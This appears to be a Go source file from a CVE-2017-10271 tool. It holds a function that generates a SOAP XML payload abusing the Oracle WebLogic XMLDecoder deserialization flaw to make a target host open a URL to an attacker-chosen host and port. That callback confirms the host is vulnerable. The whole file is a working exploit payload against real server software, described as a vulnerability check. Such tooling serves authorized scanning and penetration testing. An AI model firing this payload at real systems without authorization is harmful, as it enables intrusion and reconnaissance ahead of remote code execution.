package libcve201710271

import (
	"fmt"
	"net/url"
)

// GenerateCheckPayload is used to create a check payload for use in identifying
// vulnerable hosts
func GenerateCheckPayload(lhost string, lport int, rhost, u string) string {
	xmlPayload := fmt.Sprintf(`<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
  <java version="1.8" class="java.beans.XMLDecoder">
    <void id="url" class="java.net.URL">
      <string>http://%s:%d/cve-2017-10271?target=%s%s</string>
    </void>
    <void idref="url">
      <void id="stream" method = "openStream" />
    </void>
  </java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>`, lhost, lport, url.QueryEscape(rhost), url.QueryEscape(u))

	return xmlPayload
}
